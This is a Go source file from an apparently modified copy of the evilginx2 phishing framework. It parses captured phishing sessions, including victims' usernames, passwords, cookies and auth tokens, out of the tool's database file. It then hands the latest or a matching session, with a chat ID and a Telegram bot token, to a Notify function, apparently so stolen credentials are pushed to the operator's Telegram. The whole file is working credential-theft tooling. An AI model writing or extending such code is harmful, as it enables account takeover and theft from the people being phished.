package core

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TSession struct {
	ID         int                    `json:"id"`
	Phishlet   string                 `json:"phishlet"`
	LandingURL string                 `json:"landing_url"`
	Username   string                 `json:"username"`
	Password   string                 `json:"password"`
	Custom     map[string]interface{} `json:"custom"`
	BodyTokens map[string]interface{} `json:"body_tokens"`
	HTTPTokens map[string]interface{} `json:"http_tokens"`
	Tokens     map[string]interface{} `json:"tokens"`
	SessionID  string                 `json:"session_id"`
	UserAgent  string                 `json:"useragent"`
	RemoteAddr string                 `json:"remote_addr"`
	CreateTime int64                  `json:"create_time"`
	UpdateTime int64                  `json:"update_time"`
}

func ReadLatestSession(filePath string, sessionID string) (TSession, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return TSession{}, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	var latestSession TSession
	var currentSessionData string
	captureSession := false

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "$") {
			if captureSession {
				if currentSessionData != "" {
					var session TSession
					err := json.Unmarshal([]byte(currentSessionData), &session)
					if err == nil {
						latestSession = session
					} else {
						fmt.Printf("Error parsing session JSON: %v\n", err)
					}
					currentSessionData = ""
				}
			}
			captureSession = true
		}

		if captureSession && strings.HasPrefix(line, "{") {
			currentSessionData = line
		}
	}

	if captureSession && currentSessionData != "" {
		var session TSession
		err := json.Unmarshal([]byte(currentSessionData), &session)
		if err == nil {
			latestSession = session
		} else {
			fmt.Printf("Error parsing session JSON: %v\n", err)
		}
	}

	if err := scanner.Err(); err != nil {
		return TSession{}, fmt.Errorf("error reading file: %v", err)
	}

	return latestSession, nil
}

func ReadSessionByID(filePath string, sessionID string) (TSession, error) {
	// Add a delay of 2 seconds before starting the processing
	time.Sleep(2 * time.Second)

	file, err := os.Open(filePath)
	if err != nil {
		return TSession{}, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	var foundSession TSession
	var currentSessionData string
	captureSession := false

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		log.Debug("Processing line: %s", line) // Debug log for each line

		if strings.HasPrefix(line, "$") {
			// Process the previous session data before starting a new one
			if captureSession && currentSessionData != "" {
				// log.Debug("Captured session data: %s", currentSessionData) // Log captured session data
				var session TSession
				err := json.Unmarshal([]byte(currentSessionData), &session)
				var xsession TSession
				errx := json.Unmarshal([]byte(currentSessionData), &xsession)
				log.Debug("eror in parsing : %s", errx)
				if err == nil {
					foundSession = session
					// foundSessionx, err := json.Marshal(session)
					// if err != nil {
					// 	log.Debug("Error converting session to string: %v", err)
					// } else {
					// 	log.Debug("Session as string: %s", string(foundSessionx))
					// }

					// log.Debug("in -**-- before using  - %s \n -**--", foundSessionx)

					// if strings.Contains(string(foundSessionx), sessionID) {

					// 	break // Exit the loop once the session is found
					// }
				} else {
					log.Debug("Error parsing session JSON: %v", err)
					log.Debug("Invalid JSON data: %s", currentSessionData) // Log invalid JSON data
				}
				currentSessionData = ""
			}
			captureSession = true
		}

		if captureSession && strings.HasPrefix(line, "{") {
			currentSessionData = line
		}
	}

	// Process the last session data if the loop ends without finding the session
	if captureSession && currentSessionData != "" {
		log.Debug("Captured session data: %s", currentSessionData) // Log captured session data
		var session TSession
		err := json.Unmarshal([]byte(currentSessionData), &session)
		if err == nil {
			if session.SessionID == sessionID {
				foundSession = session
			}
		} else {
			log.Debug("Error parsing session JSON: %v", err)
			log.Debug("Invalid JSON data: %s", currentSessionData) // Log invalid JSON data
		}
	}

	if err := scanner.Err(); err != nil {
		return TSession{}, fmt.Errorf("error reading file: %v", err)
	}

	if foundSession.SessionID == "" { // Check if SessionID is empty to indicate no valid session
		return TSession{}, fmt.Errorf("session with ID %s not found", sessionID)
	}

	return foundSession, nil
}

func readFile(chatid string, teletoken string) {

	filePath := "/root/.evilginx/data.db"

	latestSession, err := ReadLatestSession(filePath, "xxxx")

	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session

		Notify(latestSession, chatid, teletoken)
	} else {
		fmt.Println("No session found.")
	}
}

func readfile_with_session_id(sessionID string, chatid string, teletoken string) {
	log.Debug("session is found - %s", sessionID)
	filePath := "/root/.evilginx/data.db"
	// latestSession, err := ReadLatestSession(filePath, sessionID)

	session, err := ReadSessionByID(filePath, sessionID)
	log.Debug("current session - %s", session)
	// log.Debug("latestSession - %s", latestSession)

	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if session.SessionID != "" { // Check if SessionID is not empty to indicate a valid session
		Notify(session, chatid, teletoken)
	} else {
		fmt.Println("No session found.")
	}
}
